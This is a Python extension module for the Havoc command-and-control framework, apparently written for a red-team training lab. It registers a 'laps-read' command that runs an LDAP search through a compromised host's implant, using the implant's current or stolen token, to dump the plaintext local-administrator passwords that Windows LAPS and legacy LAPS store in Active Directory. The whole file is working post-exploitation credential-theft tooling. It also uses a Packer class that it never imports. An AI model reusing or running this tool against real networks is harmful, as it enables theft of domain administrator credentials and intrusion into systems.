from havoc import Demon, RegisterCommand, RegisterModule

# ── LDAP filters ──────────────────────────────────────────────────
# Windows LAPS (Server 2022+ / Win 11 22H2+): msLAPS-Password attribute
# Legacy LAPS (AdmPwd.dll / MSI-based):       ms-Mcs-AdmPwd attribute
#
# Both queries target computer objects only. The Demon's current token
# (or the token of whoever you token-stole into) is used for the LDAP
# bind, so make sure you are running as a user with LAPS read rights
# (e.g. nwilson in the lab).

LAPS_FILTER_WINDOWS = "(objectCategory=computer)"
LAPS_ATTRS_WINDOWS  = "sAMAccountName,msLAPS-Password,msLAPS-EncryptedPassword,msLAPS-PasswordExpirationTime"

LAPS_FILTER_LEGACY  = "(objectCategory=computer)"
LAPS_ATTRS_LEGACY   = "sAMAccountName,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime"

LAPS_HELP = """Read LAPS passwords from Active Directory via LDAP.

Uses the Demon's current token for the LDAP bind. Run as a user with
LAPS read permissions (e.g. nwilson in the RTO lab).

Subcommands:
  laps-read                        Read Windows LAPS (msLAPS-Password) for all computers
  laps-read <COMPUTER>             Read Windows LAPS for a specific computer
  laps-read legacy                 Read legacy LAPS (ms-Mcs-AdmPwd) for all computers
  laps-read legacy <COMPUTER>      Read legacy LAPS for a specific computer

Optional parameters (positional, after subcommand args):
  /dc:<DC_HOSTNAME_OR_IP>          Target a specific Domain Controller
  /domain:<FQDN>                   Target a specific domain

Examples:
  laps-read                        Dump all Windows LAPS passwords
  laps-read WKS01                  Read LAPS password for WKS01 only
  laps-read legacy                 Dump all legacy LAPS passwords
  laps-read legacy WKS02           Read legacy LAPS for WKS02
  laps-read /dc:192.168.10.10     Target specific DC
  laps-read WKS01 /dc:DC01        Target WKS01 on DC01

Notes:
  - Windows LAPS stores passwords as JSON in msLAPS-Password:
    {"n":"Administrator","t":"...","p":"<plaintext_password>"}
  - Legacy LAPS stores plaintext in ms-Mcs-AdmPwd
  - Empty results = password not rotated yet or no read ACL
"""


def _parse_opts(params):
    """Extract /dc: and /domain: from params, return (remaining_args, hostname, domain)."""
    args = []
    hostname = ""
    domain = ""
    for p in params:
        if p.lower().startswith("/dc:"):
            hostname = p[4:]
        elif p.lower().startswith("/domain:"):
            domain = p[8:]
        else:
            args.append(p)
    return args, hostname, domain


def _run_laps_query(demon, query, attrs, hostname, domain):
    """Pack args and execute the ldapsearch BOF."""
    packer = Packer()
    packer.addstr(query)
    packer.addstr(attrs)
    packer.adduint32(0)          # result_limit (0 = unlimited)
    packer.addstr(hostname)
    packer.addstr(domain)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        "Tasked demon to query LAPS passwords via LDAP")

    demon.InlineExecute(TaskID, "go",
        f"bin/ldapsearch.{demon.ProcessArch}.o",
        packer.getbuffer(), False)

    return TaskID


def laps_read(demonID, *params):
    demon = Demon(demonID)
    args, hostname, domain = _parse_opts(params)

    # Decide legacy vs windows and optional computer target
    legacy = False
    target = None

    for a in args:
        if a.lower() == "legacy":
            legacy = True
        else:
            target = a

    if legacy:
        attrs  = LAPS_ATTRS_LEGACY
        if target:
            query = f"(&(objectCategory=computer)(sAMAccountName={target}$))"
        else:
            query = LAPS_FILTER_LEGACY
    else:
        attrs = LAPS_ATTRS_WINDOWS
        if target:
            query = f"(&(objectCategory=computer)(sAMAccountName={target}$))"
        else:
            query = LAPS_FILTER_WINDOWS

    return _run_laps_query(demon, query, attrs, hostname, domain)


RegisterCommand(laps_read, "", "laps-read",
    "Read LAPS passwords (Windows or legacy) from AD via LDAP",
    0,
    LAPS_HELP,
    "laps-read WKS01")
